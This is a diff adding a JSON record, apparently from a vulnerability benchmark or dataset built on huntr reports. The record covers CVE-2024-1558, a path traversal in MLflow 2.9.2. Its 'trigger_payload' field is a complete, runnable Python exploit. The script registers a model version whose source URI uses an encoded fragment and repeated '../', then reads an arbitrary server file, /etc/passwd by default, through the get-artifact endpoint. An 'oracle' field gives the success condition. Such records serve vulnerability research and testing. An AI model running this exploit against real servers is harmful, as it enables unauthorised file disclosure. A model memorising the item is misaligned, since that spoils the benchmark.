@@ -1,0 +1,15 @@
+{
+  "file_id": "198_mlflow_huntr_7f4dbcc5-b6b3-43dd-b310-e2d0556a8081",
+  "numeric_id": "198",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal in model version source due to improper URI validation in MLflow",
+  "cve": "CVE-2024-1558",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "== 2.9.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "from argparse import ArgumentParser\nfrom random import randbytes\nfrom requests import Session\nfrom urllib.parse import unquote\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", required=True)\n    parser.add_argument(\"--path\", default=\"/etc/passwd\")\n    args = parser.parse_args()\n    url = args.url\n    ajax_api = f\"{url}/ajax-api/2.0/mlflow\"\n    with Session() as s:\n        # upload an artifact to force creation of './mlartifacts' directory in serv\n        # no artifacts were uploaded before:\n        experiment_name = \"e_\" + randbytes(4).hex()\n        rsp = s.post(f\"{ajax_api}/experiments/create\", json={ \"name\" : experiment_name })\n        experiment_id = rsp.json()[\"experiment_id\"]\n        rsp = s.post(f\"{ajax_api}/runs/create\", json={ \"experiment_id\" : experiment_id })\n        run_uuid = rsp.json()[\"run\"][\"info\"][\"run_uuid\"]\n        rsp = s.post(f\"{ajax_api}/upload-artifact?run_uuid={run_uuid}&path=xxx\", data=\"\")\n        rsp = s.post(f\"{ajax_api}/experiments/delete\", json={ \"experiment_id\" : experiment_id })\n        # create a registered model and version:\n        model_name = \"m_\" + randbytes(4).hex()\n        rsp = s.post(f\"{ajax_api}/registered-models/create\", json={ \"name\" : model_name })\n        rsp = s.post(f\"{ajax_api}/model-versions/create\", json={\n            \"name\" : model_name,\n            \"source\": f\"http:///xxx%23/api/2.0/mlflow-artifacts/artifacts/../../../../../../../../../../../\"\n        })\n        rsp = s.get(f\"{args.url}/model-versions/get-artifact\", params={\n            \"name\" : model_name,\n            \"version\" : 1,\n            \"path\" : args.path.removeprefix(\"/\")\n        })\n        try:\n            print(rsp.content.decode())\n        except UnicodeDecodeError:\n            print(rsp.content)",
+  "oracle": "The server reads and returns the content of a local file (e.g., /etc/passwd) via the response."
+}
